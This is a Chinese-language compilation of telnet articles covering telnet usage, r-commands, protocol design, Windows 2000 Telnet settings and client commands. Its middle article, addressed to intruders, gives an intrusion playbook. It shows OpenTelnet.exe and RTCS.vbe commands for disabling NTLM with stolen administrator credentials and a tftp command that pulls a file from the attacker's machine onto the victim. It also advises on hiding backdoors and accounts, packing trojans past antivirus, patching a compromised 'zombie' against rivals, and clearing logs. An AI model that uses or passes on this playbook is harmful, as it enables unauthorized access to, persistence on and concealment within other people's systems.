使用telnet命令访问远程计算机 
　　用户使用telnet命令进行远程登录。该命令允许用户使用telnet协议在远程计算机之间进行通信，用户可以通过网络在远程计算机上登录，就像登录到本地机上执行命令一样。为了通过telnet登录到远程计算机上，必须知道远程机上的合法用户名和口令。
  虽然有些系统确实为远程用户提供登录功能，但出于对安全的考虑，要限制来宾的操作权限，因此，这种情况下能使用的功能是很少的。当允许远程用户登录时，系统通常把这些用户放在一个受限制的shell中，以防系统被怀有恶意的或不小心的用户破坏。用户还可以使用telnet从远程站点登录到自己的计算机上，检查电子邮件、编辑文件和运行程序，就像在本地登录一样。 
　　但是，用户只能使用基于终端的环境而不是X Wndows环境，telnet只为普通终端提供终端仿真，而不支持 X Wndow等图形环境。 

　　telnet命令的一般形式为：
telnet 主机名/IP 其中“主机名/IP”是要连接的远程机的主机名或IP地址。
例：　telnet 192.168.0.1
如果这一命令执行成功，将从远程机上得到login：提示符。
　　使用telnet命令登录的过程如下：$ telnet 主机名/IP 启动telnet会话。 
一旦telnet成功地连接到远程系统上，就显示登录信息并提示用户输人用户名和口令。如果用户名和口令输入正确，就能成功登录并在远程系统上工作。在telnet提示符后面可以输入很多命令，用来控制telnet会话过程，在telnet联机帮助手册中对这些命令有详细的说明。 
　　下面是一台Linux计算机上的telnet会话举例： 
　　$ telnet server. somewhere. com Trying 127.0.0.1… Connected to serve. somewhere. com. Escape character is \';?]\';. “TurboLinux release 4. 0 （Colgate）
　 kernel 2.0.18 on an I486 
　 login: bubba password: Last login:Mon Nov l5 20:50:43 for localhost Linux 2. 0.6. （Posix）. server: ~$ server: ~$ logout Connection closed by foreign host $ 
　　用户结束了远程会话后，一定要确保使用logout命令退出远程系统。然后telnet报告远程会话被关闭，并返回到用户的本地机的Shell提示符下。
　　r-系列命令 除ftp和telnet以外，还可以使用r-系列命令访问远程计算机和在网络上交换文件。使用r-系列命令需要特别注意，因为如果用户不小心，就会造成严重的安全漏洞。用户发出一个r-系列命令后，远程系统检查名为/etc/hosts.equiv的文件，以查看用户的主机是否列在这个文件中。如果它没有找到用户的主机，就检查远程机上同名用户的主目录中名为．rhosts的文件，看是否包括该用户的主机。如果该用户的主机包括在这两个文件中的任何一个之中，该用户执行r-系列命令就不用提供口令。 
　　虽然用户每次访问远程机时不用键入口令可能是非常方便的，但是它也可能会带来严重的安全问题。我们建议用户在建立/etc/hosts.equiv和.rhosts文件之前，仔细考虑r-命令隐含的安全问题。 


******************************************************　
telnet命令的使用详解
一 摘要 

　　Telnet的应用不仅方便了我们进行远程登录，也给hacker们提供了又一种入侵手段和后门，但无论如何，在你尽情享受Telnet所带给你的便捷的同时，你是否真正的了解Telnet呢？ 

　　二 远程登录 

　　Telnet服务虽然也属于客户机/服务器模型的服务，但它更大的意义在于实现了基于Telnet协议的远程登录（远程交互式计算），那么就让我们来认识一下远程登录。 

　　1 远程登陆的基本概念 

　　先来看看什么叫登录：分时系统允许多个用户同时使用一台计算机，为了保证系统的安全和记帐方便，系统要求每个用户有单独的帐号作为登录标识，系统还为每个用户指定了一个口令。用户在使用该系统之前要输入标识和口令，这个过程被称为';登录';。 

　　远程登陆是指用户使用Telnet命令，使自己的计算机暂时成为远程主机的一个仿真终端的过程。仿真终端等效于一个非智能的机器，它只负责把用户输入的每个字符传递给主机，再将主机输出的每个信息回显在屏幕上。 

　　2 远程登陆的产生及发展 

　　我们可以先构想一个提供远程文字编辑的服务，这个服务的实现需要一个接受编辑文件请求和数据的服务器以及一个发送此请求的客户机。客户机将建立一个从本地机到服务器的TCP连接，当然这需要服务器的应答，然后向服务器发送键入的信息（文件编辑信息），并读取从服务器返回的输出。以上便是一个标准而普通的客户机/服务器模型的服务。 

　　似乎有了客户机/服务器模型的服务，一切远程问题都可以解决了。然而实际并非你想象的那样简单，如果我们仅需要远程编辑文件，那么刚才所构想的服务完全可以胜任，但假如我们的要求并不是这么简单，我们还想实现远程用户管理，远程数据录入，远程系统维护，想实现一切可以在远程主机上实现的操作，那么我们将需要大量专用的服务器程序并为每一个可计算服务都使用一个服务器进程，随之而来的问题是：远程机器会很快对服务器进程应接不暇，并淹没在进程的海洋里（我们在这里排除最专业化的远程机器）。 

　　那么有没有办法解决呢？当然有，我们可以用远程登录来解决这一切。我们允许用户在远地机器上建立一个登录会话，然后通过执行命令来实现更一般的服务，就像在本地操作一样。这样，我们便可以访问远地系统上所有可用的命令，并且系统设计员不需提供多个专用地服务器程序。 

　　问题发展到这里好像前途一片光明了，用远程登录总应该解决问题了吧，但要实现远程登陆并不简单。不考虑网络设计的计算机系统期望用户只从直接相连的键盘和显示器上登录，在这种机器上增加远程登陆功能需要修改机器的操作系统，这是极其艰巨也是我们尽量避免的。因此我们应该集中力量构造远程登陆服务器软件，虽然这样也是比较困难的。为什么说这样做也比较困难呢？ 

　　举个例子来说：一般，操作系统会为一些特殊按键分配特殊的含义，比如本地系统将';Ctrl+C';解释为：';终止当前运行的命令进程';。但假设我们已经运行了远程登陆服务器软件，';Ctrl+C';也有可能无法被传送到远地机器，如果客户机真的将';Ctrl+C';传到了远地机器，那么';Ctrl+C';这个命令有可能不能终止本地的进程，也就是说在这里很可能会产生混乱。而且这仅仅是遇到的难题之一。 

　　但尽管有技术上的困难，系统编程人员还是设法构造了能够应用于大多数操作系统的远程登陆服务器软件，并构造了充当客户机的应用软件。通常，客户机软件取消了除一个键以外的所有键的本地解释，并将这些本地解释相应的转换成远地解释，这就使得客户机软件与远地机器的交互，就如同坐在远程主机面前一样，从而避免了上述所提到的混乱。而那个唯一例外的键，可以使用户回到本地环境。 

　　将远程登陆服务器设计为应用级软件，还有另一个要求，那就是需要操作系统提供对伪终端（pseudo terminal）的支持。我们用伪终端描述操作系统的入口点，它允许像Telnet服务器一样的程序向操作系统传送字符，并且使得字符像是来自本地键盘一样。只有使用这样的操作系统，才能将远程登陆服务器设计为应用级软件（比如Telnet服务器软件），否则，本地操作系统和远地系统传送将不能识别从对方传送过来的信息（因为它们仅能识别从本地键盘所键入的信息），远程登陆将宣告失败。 

　　将远程登陆服务器设计为应用级软件虽然有其显著的优点：比将代码嵌入操作系统更易修改和控制服务器。但其也有效率不高的缺点（后面的内容将会给予解释），好在用户键入信息的速率不高，这种设计还是可以接受的。 

　　3 远程登录的工作过程 

　　使用Telnet协议进行远程登陆时需要满足以下条件：在本的计算机上必须装有包含Telnet协议的客户程序；必须知道远程主机的Ip地址或域名；必须知道登录标识与口令。 

　　Telnet远程登录服务分为以下4个过程： 

　　1）本地与远程主机建立连接。该过程实际上是建立一个TCP连接，用户必须知道远程主机的Ip地址或域名； 

　　2）将本地终端上输入的用户名和口令及以后输入的任何命令或字符以NVT（Net Virtual Terminal）格式传送到远程主机。该过程实际上是从本地主机向远程主机发送一个IP数据报； 

　　3）将远程主机输出的NVT格式的数据转化为本地所接受的格式送回本地终端，包括输入命令回显和命令执行结果； 

　　4）最后，本地终端对远程主机进行撤消连接。该过程是撤销一个TCP连接。 

　　上面的内容只是讨论了远程登陆最基本的东西，其中的复杂和编程人员的艰辛是我们难以想象的，不知道你在舒服的使用Telnet的同时，是否想到了这些！ 

　　三 Telnet协议 

　　我们知道Telnet服务器软件是我们最常用的远程登录服务器软件，是一种典型的客户机/服务器模型的服务，它应用Telnet协议来工作。那么，什么是Telnet协议？它都具备哪些特点呢？ 

　　1 基本内容 

　　Telnet协议是TCP/IP协议族中的一员，是Internet远程登陆服务的标准协议。应用Telnet协议能够把本地用户所使用的计算机变成远程主机系统的一个终端。它提供了三种基本服务： 

　　1）Telnet定义一个网络虚拟终端为远的系统提供一个标准接口。客户机程序不必详细了解远的系统，他们只需构造使用标准接口的程序； 

　　2）Telnet包括一个允许客户机和服务器协商选项的机制，而且它还提供一组标准选项； 

　　3）Telnet对称处理连接的两端，即Telnet不强迫客户机从键盘输入，也不强迫客户机在屏幕上显示输出。 

　　2 适应异构 

　　为了使多个操作系统间的Telnet交互操作成为可能，就必须详细了解异构计算机和操作系统。比如，一些操作系统需要每行文本用ASCII回车控制符（CR）结束，另一些系统则需要使用ASCII换行符（LF），还有一些系统需要用两个字符的序列回车-换行（CR-LF）；再比如，大多数操作系统为用户提供了一个中断程序运行的快捷键，但这个快捷键在各个系统中有可能不同（一些系统使用CTRL+C，而另一些系统使用ESCAPE）。如果不考虑系统间的异构性，那么在本地发出的字符或命令，传送到远地并被远地系统解释后很可能会不准确或者出现错误。因此，Telnet协议必须解决这个问题。 

　　为了适应异构环境，Telnet协议定义了数据和命令在Internet上的传输方式，此定义被称作网络虚拟终端NVT（Net Virtual Terminal）。它的应用过程如下： 

　　对于发送的数据：客户机软件把来自用户终端的按键和命令序列转换为NVT格式，并发送到服务器，服务器软件将收到的数据和命令，从NVT格式转换为远地系统需要的格式； 
　　对于返回的数据：远地服务器将数据从远地机器的格式转换为NVT格式，而本地客户机将将接收到的NVT格式数据再转换为本地的格式。 
　　对于NVT格式的详细定义，有兴趣的朋友可以去查找相关资料。 

　　3 传送远地命令 

　　我们知道绝大多数操作系统都提供各种快捷键来实现相应的控制命令，当用户在本地终端键入这些快捷键的时候，本地系统将执行相应的控制命令，而不把这些快捷键作为输入。那么对于Telnet来说，它是用什么来实现控制命令的远地传送呢？ 

　　Telnet同样使用NVT来定义如何从客户机将控制功能传送到服务器。我们知道USASCII字符集包括95个可打印字符和33个控制码。当用户从本地键入普通字符时，NVT将按照其原始含义传送；当用户键入快捷键（组合键）时，NVT将把它转化为特殊的ASCII字符在网络上传送，并在其到达远地机器后转化为相应的控制命令。将正常ASCII字符集与控制命令区分主要有两个原因： 

　　1）这种区分意味着Telnet具有更大的灵活性：它可在客户机与服务器间传送所有可能的ASCII字符以及所有控制功能； 

　　2）这种区分使得客户机可以无二义性的指定信令，而不会产生控制功能与普通字符的混乱。 

　　4 数据流向 

　　上面我们提到过将Telnet设计为应用级软件有一个缺点，那就是：效率不高。这是为什么呢？下面给出Telnet中的数据流向： 

　　数据信息被用户从本地键盘键入并通过操作系统传到客户机程序，客户机程序将其处理后返回操作系统，并由操作系统经过网络传送到远地机器，远地操作系统将所接收数据传给服务器程序，并经服务器程序再次处理后返回到操作系统上的伪终端入口点，最后，远地操作系统将数据传送到用户正在运行的应用程序，这便是一次完整的输入过程；输出将按照同一通路从服务器传送到客户机。 

　　因为每一次的输入和输出，计算机将切换进程环境好几次，这个开销是很昂贵的。还好用户的键入速率并不算高，这个缺点我们仍然能够接受。 

　　5 强制命令 

　　我们应该考虑到这样一种情况：假设本地用户运行了远地机器的一个无休止循环的错误命令或程序，且此命令或程序已经停止读取输入，那么操作系统的缓冲区可能因此而被占满，如果这样，远地服务器也无法再将数据写入伪终端，并且最终导致停止从TCP连接读取数据，TCP连接的缓冲区最终也会被占满，从而导致阻止数据流流入此连接。如果以上事情真的发生了，那么本地用户将失去对远地机器的控制。 

　　为了解决此问题，Telnet协议必须使用外带信令以便强制服务器读取一个控制命令。我们知道TCP用紧急数据机制实现外带数据信令，那么Telnet只要再附加一个被称为数据标记(date mark)的保留八位组，并通过让TCP发送已设置紧急数据比特的报文段通知服务器便可以了，携带紧急数据的报文段将绕过流量控制直接到达服务器。作为对紧急信令的相应，服务器将读取并抛弃所有数据，直到找到了一个数据标记。服务器在遇到了数据标记后将返回正常的处理过程。 

　　6 选项协商 

　　由于Telnet两端的机器和操作系统的异构性，使得Telnet不可能也不应该严格规定每一个telnet连接的详细配置，否则将大大影响Telnet的适应异构性。因此，Telnet采用选项协商机制来解决这一问题。 

　　Telnet选项的范围很广：一些选项扩充了大方向的功能，而一些选项制涉及一些微小细节。例如：有一个选项可以控制Telnet是在半双工还是全双工模式下工作（大方向）；还有一个选项允许远地机器上的服务器决定用户终端类型（小细节）。 

　　Telnet选项的协商方式也很有意思，它对于每个选项的处理都是对称的，即任何一端都可以发出协商申请；任何一端都可以接受或拒绝这个申请。另外，如果一端试图协商另一端不了解的选项，接受请求的一端可简单的拒绝协商。因此，有可能将更新，更复杂的Telnet客户机服务器版本与较老的，不太复杂的版本进行交互操作。如果客户机和服务器都理解新的选项，可能会对交互有所改善。否则，它们将一起转到效率较低但可工作的方式下运行。所有的这些设计，都是为了增强适应异构性，可见Telnet的适应异构性对其的应用和发展是多么重要。 

　　上面讨论了一些原理方面的东西，虽然我们在Telnet的使用过程中很难接触到这一层面，但我认为了解这些是有意义的，它会给我们带来许多启示。下面让我们来看看Win2000的Telnet服务。 

　　四 Win2000的Telnet服务 

　　其实从应用层面上，Win2000的Telnet服务并没有什么可说的，绝大部分内容你都可以从HELP文件中得到，我在此只是把它稍微整理一下而已。 

　　1 基本配置 

　　Win2000为我们提供了Telnet客户机和服务器程序：Telnet.exe是客户机程序（Client），tlntsvr.exe是服务器程序（server），同时它还为我们提供了Telnet服务器管理程序tlntadmn.exe。 

　　Windows 2000 默认安装了 Telnet 服务，但是并没有默认启动。下面给出HELP文件中 Telnet 服务的一部分默认设置： 

　　AllowTrustedDomain：是否允许域用户访问。默认值是1，允许信任域用户访问。可以改为0: 不允许域用户访问（只允许本地用户）。 

　　DefaultDomain：可以对与该计算机具有信任关系的任何域设置。默认值是"."。 

　　DefaultShell：显示 shell 安装的路径位置。默认值是： %systemroot%System32Cmd.exe /q /k 

　　MaxFailedLogins：在连接终止之前显示尝试登录失败的最大次数。默认是3。 

　　LoginScript：显示 Telnet 服务器登录脚本的路径位置。默认的位置就是“%systemroot%System32login.cmd”，你可以更改脚本内容，这样登录进Telnet的欢迎屏幕就不一样了。 

　　NTLM：NTLM身份验证选项。默认是2。可以有下面这些值： 
　　0: 不使用 NTLM 身份验证。 
　　1: 先尝试 NTLM 身份验证，如果失败，再使用用户名和密码。 
　　2: 只使用 NTLM 身份验证。 

　　TelnetPort：显示 telnet 服务器侦听 telnet 请求的端口。默认是：23。你也可以更改为其他端口。 

　　以上各项设置你可以使用tlntadmn.exe（Telnet服务器管理程序）来进行非常方便的配置，配置后需要重新启动Telnet服务。如图1 

　　2 NTLM 

　　提到了telnet就不能不提NTLM，我想这也是让入侵者最为头痛的一件事，哪怕你获得了管理员帐号和密码，想简单通过NTLM也并非易事，况且win2000中的telnet默认仅以NTLM方式验证身份，这就让我们不得不关注NTLM这个东东，那么什么是NTLM呢？ 

　　早期的SMB协议在网络上明文传输口令，后来出现了"LAN Manager Challenge/Response"验证机制，简称LM，它十分简单以至很容易被破解，微软随后提出了WindowsNT挑战/响应验证机制，即NTLM。现在已经有了更新的NTLMv2以及Kerberos验证体系。NTLM工作流程是这样的： 

　　1、客户端首先在本地加密当前用户的密码成为密码散列 
　　2、客户端向服务器发送自己的帐号，这个帐号是没有经过加密的，明文直接传输 
　　3、服务器产生一个16位的随机数字发送给客户端，作为一个 challenge（挑战） 
　　4、客户端再用加密后的密码散列来加密这个 challenge ，然后把这个返回给服务器。作为 response（响应） 
　　5、服务器把用户名、给客户端的challenge 、客户端返回的 response 这三个东西，发送域控制器 
　　6、域控制器用这个用户名在 SAM密码管理库中找到这个用户的密码散列，然后使用这个密码散列来加密 challenge。 
　　7、域控制器比较两次加密的 challenge ，如果一样，那么认证成功。 

　　从上面的过程我们可以看出，NTLM是以当前用户的身份向Telnet服务器发送登录请求的，而不是用你扫到的对方管理员的帐户和密码登录，显然，你的登录将会失败。举个例子来说，你家的机器名为A（本地机器），你入侵的机器名为B（远地机器），你在A上的帐户是xinxin，密码是1234，你扫到B的管理员帐号是Administrator，密码是5678，当你想Telnet到B时，NTLM将自动以当前用户的帐号和密码作为登录的凭据来进行上面的7项操作，即用xinxin和1234，而并非用你扫到的Administrator和5678，且这些都是自动完成的，根本不给你插手的机会，因此你的登录操作将失败。 

　　由于Telnet服务器对NTLM的使用有3个选项，所以当你Telnet远地机器时，会显示下面情况中的一种： 

　　1)身份验证选项=0时 
　　===================================== 
　　Microsoft (R) Windows (TM) Version 5.00 (Build 2195) 
　　Welcome to Microsoft Telnet Service 
　　Telnet Server Build 5.00.99201.1 
　　login: 
　　password: 

　　\为0时不使用NTML身份验证，直接输入用户名和密码，比如你可以输入扫到的Administrator和5678 

　　2)身份验证选项=1时 
　　===================================== 
　　NTLM Authentication failed due to insufficient credentials. Please login withclear text username and password 
　　Microsoft (R) Windows (TM) Version 5.00 (Build 2195) 
　　Welcome to Microsoft Telnet Service 
　　Telnet Server Build 5.00.99201.1 
　　login: 
　　password: 

　　\先尝试 NTLM 身份验证，如果失败，再使用用户名和密码，其实这种方式对于我们来说，与上一种方式没什么区别 

　　3)身份验证选项=2时 
　　===================================== 
　　NTLM Authentication failed due to insufficient credentials. Please login withclear text username and password 
　　Server allows NTLM authentication only 
　　Server has closed connection 
　　遗失对主机的连接。 
　　C:> 

　　\仔细看看上面的显示，根本没有给你输入用户名和密码的机会，直接断开连接，扫到了密码也是白扫 

　　所以对于入侵者来说，NTLM是横在我们面前的一座大山，必须要除掉它，一般我们有如下几种方法： 

　　1通过修改远程注册表更改telnet服务器配置，将验证方式从2改为1或0； 
　　2使用NTLM.exe，上传后直接运行，可将telnet服务器验证方式从2改为1； 
　　3在本地建立扫描到的用户，以此用户身份开启telnet客户机并进行远程登录； 
　　4使用软件，比如opentelnet.exe（需要管理员权限且开启IPC管道） 
　　5使用脚本，如RTCS，（需要管理员权限但不依赖IPC管道） 

　　基本上是以上的5种，其中后两种是我们比较常用的开telnet的手法，而且使用方法十分简单，命令如下： 

　　OpenTelnet.exe \server username password NTLMAuthor telnetport 
　　OpenTelnet.exe \服务器地址 管理员用户名 密码 验证方式（填0或1） telnet端口 

　　cscript RTCS.vbe targetIP username password NTLMAuthor telnetport 
　　cscript RTCS.vbe <目标IP> <管理员用户名> <密码> <验证方式> 

　　五 在telnet中该做什么 

　　本来写到上面就想结束了，不过许多朋友都说telnet上去后不知道该做什么了，既然这样，那我就抛砖引玉吧，这次不讲具体做法，只是说说思路，什么？为什么不讲具体做法？篇幅不够嘛，以后我会一一解释的。 

　　1 查看系统信息 

　　呵呵，其实就是随处看看，看看他的系统配置和版本（用type c:oot.ini来知道pro版或server版），看看都装了什么服务或软件（从目录名就可以知道了），看看有什么重要或有趣的文件啦（唉，要是国外的机器，看也看不懂），看看他的用户情况，总之就是尽可能多的了解系统，为一会装后门摸底。 

　　2 使用tftp传送文件 

　　想必大家都遇到过在telnet中传输文件的问题，因为我们习惯了在ipc管道中的文件传输，所以有些朋友喜欢用net share ipc$ 来打开管道，进而利用copy来传输文件。不过这样反而麻烦，既然我们已经得到了shell，我们可以用TFPT命令来完成这一切，什么是TFTP呢？ 

　　用TFTP(Trivial File Transfer Protocol)来实现文件的传送是一种基于UDP连接的文件传输，一般是使用Windows自带的tftp.exe和一个TFTP服务器端软件构成一个完整的传输结构。它是这样使用的： 首先运行本地的TFTP Server（比如tftpd32.exe）软件并保证始终开启直至传输全部完成， 然后在telnet中（当然你也可以在其他shell中）运行下面的命令： 
　　C:>tftp Ci ip get xinxin.exe c:abcxinxin.exe 
　　其中ip为你自己机器的ip，且上传文件要与TFTP服务器端在同一目录下，这样你就可以把xinxin.exe上传到c盘abc目录下了（其实是从tftp服务器下载来的） 

　　需要指出的是，如果使用代理IP，你将不能实现与外部网络的文件传送。因为你的代理网关在进行数据封装的时候会将自己的IP地址加入到你的数据报中，代替你的内部网络地址，所以在外部网络进行MAC寻址时是找不到你这台TFTP服务器的。 

　　3 安置后门 

　　安置后门放在第二步好像早了点，如果你入侵还有其他目的，比如以破坏为主，或者是来修改主页的，那么这些事情当然可以在安置后门之前做；如果你只是想得到一只肉鸡，那就没什么可说的了，安后门吧。 

　　后门的种类繁多，也给我们提供了很大的选择余地，能够根据具体情况选择合适的后门的确是一门学问。常用的后门一般有：木马，asp木马，远程控制软件，克隆帐户，建立并隐藏帐户，telnet，telnet扩展的shell，终端服务等。安置一个好的后门通常要注意以下几点： 

　　1 不会被防火墙查杀及阻碍通信：被加入病毒库的后门最好加壳以逃过防火墙，尽量用低端口通信，以免被防火墙屏蔽。 

　　2 最大限度增加隐蔽性：如果你选择远程控制软件，要注意被控端的安装提示和小图标，以及是否同步画面；如果你在帐户上做文章，要尽量保持在cmd和用户管理中都不出破绽；如果你选择放木马或telnet扩展，要注意文件和进程的隐藏；如果新开了终端服务（入侵前并没有开），一定要该掉3389这个显眼的端口，且越低越好。 

　　3 不要当管理员不存在：这是一个大忌，许多朋友在只有默认帐户的机器上建立类似';hacking';的管理员帐户，真是无知者无畏呀。所以安置后门的时候，想想管理员疏忽的地方会在哪里。 

　　4 打补丁 

　　如果想独霸肉鸡，就要会打补丁，要知道对肉鸡的竞争是很激烈的。怎么打补丁呢？这个也要问？想想你是怎么进来的吧。算了，提示一下，除了修补大的漏洞以外（上传官方补丁并运行），也要注意它的共享，ipc$共享（最好都关闭），可疑端口，容易被利用的服务等。不过打补丁也要注意隐蔽性的，不要让管理员发现大的改动。 

　　5 清除日志 

　　可以手动或利用软件，如果不太会就去找相关教材吧，在这里我不详细介绍了。 

　　六 结束语 

　　文章的前部分主要说了一些原理性的东西，后部分则侧重于应用，写的多了难免会有些遗漏。

************************************************
当开始运行Telnet时,情况如何呢?一个应用系统由两部分组成:“client”――这就是Telnet简介所说的客户机，另一部分是“server”――这是运行于网络计算机上提供服务的系统，称之为服务器。而网络（即使用TCP也使用UDP的服务器）则是提供两者（Clinet与Server)通信的工具。 
这里要求客户机必须做到: 
(1)建立一个网络与服务器间的TCP连接 
(2)以方便的方式接收输入 
(3)对某些标准的格式化输入作重新格式化并作重新格式化并传送给服务器。 
(4)以某些标准的格式化从服务器中接受输出 
(5)重新格式化显示给自己的输出 
服务器软件是运行于主机上提供服务的系统，如果没有运行服务系统，也就不能提供相应的服务。 
某一类服务被调用，它就可以： 
(1)通知网络软件，让它准备连接； 
(2)等待一个标准的格式化要求的产生； 
(3)服务请求； 
(4)传送一个标准格式的结果给客户； 
(5)重新等待 
一个服务器应该能够处理各种客户，有的是运行在同类的电脑上的，而有的是运行在 IBM / PCs , Macintoshes , Amigas等各种不同的机器上。为了做到这一点，服务器必须具有一套通信规则，这种规则通常叫做协议。由于Telnet协议用于两个应用层之间所以叫做应用层协议。任何人都可以在任何类型的电脑上编制一个客户机。只要这个客户机可以上网通讯并遵守协议，他就可以进入服务器。实际上也就是说，用户的 Macintosh可以使用Telnet和其他的的Internet的工具，从而能让很多不同的系统为其工作。 
就使用来说，一个应用层协议通常允许客户机和服务器有不同的数据设定，并通告客户机和服务器使用相互的通信方式。这些经常是有每行在开始的几个字节的文本程序来完成的。如果服务器发送一个以“TXT”字符开头的行命令给客户，那么这行 “TXT” 后边其他的数据就被送入屏幕显示。如果一行的开始是以“CMD”开始，则表明这些信息是从服务软件到客户软件。使用者是看不到这些的，这是因为在信息传送到时这些控制信号已去掉了。 

除了在Telnet是如何工作的例子介绍的以外,Telnet还有很多的特点。Telnet可发送除了"escape"的任何字符到远程主机上。因为"escape"字符在Telnet中是客户机的一个特殊的命令模式，它的默认值是"Ctrl-]"。但要注意不要与键盘上的Esc键混淆，我们可以设定"escape"为任意某个字符，只是对Telnet来说以为着该字符不可能再被传送到远程主机上，而Esc键是一非打印字符，Telnet用它来删除远程系统中的命令。而且还应记住，"escape"字符并不总以"Ctrl-]"来表示。 
可以仅仅键入Telnet,后面不带机器字句。这种情况下所看到的是Telnet>,这是告知Telnet在等待键入命令，比如键入问号"?"那么就得到一个有用的命令表： 
telnet: ? 
CoMMands may be abbreviated, CoMMand are: 
open connect to a site 
close close currect connection 
quit exit telnet 
display display operating parameters 
send transmit special characters (';send ?'; for more) 
set set operating parameters(';set ?'; for more) 
status print status information 
toggle toggle operating parameters(';toggle ?'; for more) 
mode try to enter line-by-line or character-at-a-time mode 
? print help information 
虽然命令很多，甚至还有子命令，但只有一些是常用的。现在介绍以下的几个： 
Close： 
该命令用语终止连接。它自动切断与远程系统的连接，也可以用它退出Telnet，在冒失的进入一个网络主机时，想退出的话，就可以用到这个命令。 
open： 
用它来与一个命名机器连接，要求给出目标机器的名字或IP地址。如果未给出机器名，Telnet就将要你选择一个机器名。必须注意，在使用"Open"命令之前应该先用"close"来关闭任何已经存在的连接。 
Set ECHO： 
用于本地的响应是On或是Off。作用是是否把输出的内容显示在屏幕上。和DOS的ECHO基本上是一样。如果机器是处于ECHO ON的话，想改变为OFF，那么就可以输入SET ECHO,想再改变回ECHO OFF，那么就再键入SET ECHO就可以了。(这儿说的比较简短,如果有不明白的,可以与我联系) 
Set escape char: 
建立"escape"字符到某个特殊的符号，若想用某种控制符号来代替，可以用"asis"或者键入符号"^"加字母b(如：^b）。在正常工作时，是不需要用"escape"这个字符的，并且这个被用作"escape"的符号不应该再被使用。这类似于许多程序中对键盘上的每一个键设定其真正的涵义。但如果正在运行一个 daisy-chained 应用系统，那么可以重新议定"escape"字符的特征便是很有用的。例如：用Telnet从系统A到系统B，接着又用Telnet注册进入系统C。如果正在系统C上工作时出了故障，那么当"escape"代表符是相同时，就没法中断系统B到系统C的连接。键入"escape"代表符，将总是处于系统A的命令模式。如果在每个Telnet部分使用不同的"escape"代表符，便可以通过键入适当的符号，来选择其中一个命令模式，这也可以用于其他的应用中（像终端仿真）。 
Quit: 
用它可顺利地推出Telnet程序。 
Z: 
用语保留Telnet但暂时回到本地系统执行其他命令。并且在Telnet中的连接以及其他的选择在Telnet恢复时仍被保留。 
Carriage Return: 
用于不具体的一个命令从命令模式返回到所连接的远程机器上。另外，还有许多其他的命令可以推出命令模式。下面举一个例子，是从注册进入到porky.math.ukans.edu ,然后进入命令模式，然后返回porky:: 
telnet porky.math.ukans.edu 
Trying 129.237.128.11... 
Connected to porky.math.ukans.edu. 
Escape character is ';^]';. 
SunOS UNIX(porky) 
login:wl 
password: 
Last Login: Tue Mar 28 05:35 from ns.bta.net.cn 
SunOS Release 4.1.3_U1(SLIPPERY1) #3: Sun Nov 20 23:47:23 CST 1999 
No match. 
if:Expression syntax. 
porky/serv/wl%cd/ 
porky/%CTRL-] 
telnet:? 
CoMMands may be abbreviated, CoMMand are: 
open connect to a site 
close close currect connection 
quit exit telnet 
display display operating parameters 
send transmit special characters (';send ?'; for more) 
set set operating parameters(';set ?'; for more) 
status print status information 
toggle toggle operating parameters(';toggle ?'; for more) 
mode try to enter line-by-line or character-at-a-time mode 
? print help information 
telnet:set escape ^b 
escape character is ’^b’ 
porky/%logout 
ns.bta.net.cn% 
注意：set命令也可以退出命令模式。当然，如果不行，可以回车输入一空行，也能回到porky。
 

收藏 分享 评分 